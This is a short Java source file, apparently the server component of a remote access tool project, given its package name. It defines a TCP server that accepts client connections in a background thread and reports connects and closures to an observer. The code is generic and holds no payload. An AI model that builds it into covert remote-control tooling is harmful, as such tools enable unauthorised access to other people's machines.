package de.sogomn.rat.server;

import java.net.Socket;

import de.sogomn.engine.net.TCPServer;
import de.sogomn.rat.ActiveConnection;

public final class ActiveServer extends TCPServer {
	
	private Thread thread;
	
	private IServerObserver observer;
	
	public ActiveServer(final int port) {
		super(port);
	}
	
	private ActiveConnection acceptClient() {
		final Socket socket = acceptConnection();
		
		if (socket == null) {
			return null;
		}
		
		final ActiveConnection client = new ActiveConnection(socket);
		
		return client;
	}
	
	@Override
	public void close() {
		super.close();
		
		if (thread != null) {
			thread.interrupt();
			thread = null;
		}
		
		if (observer != null) {
			observer.closed(this);
		}
	}
	
	public void start() {
		final Runnable runnable = () -> {
			while (isOpen()) {
				final ActiveConnection client = acceptClient();
				
				if (observer != null && client != null) {
					observer.connected(this, client);
				}
			}
		};
		
		thread = new Thread(runnable);
		
		thread.start();
	}
	
	public void setObserver(final IServerObserver observer) {
		this.observer = observer;
	}
	
}
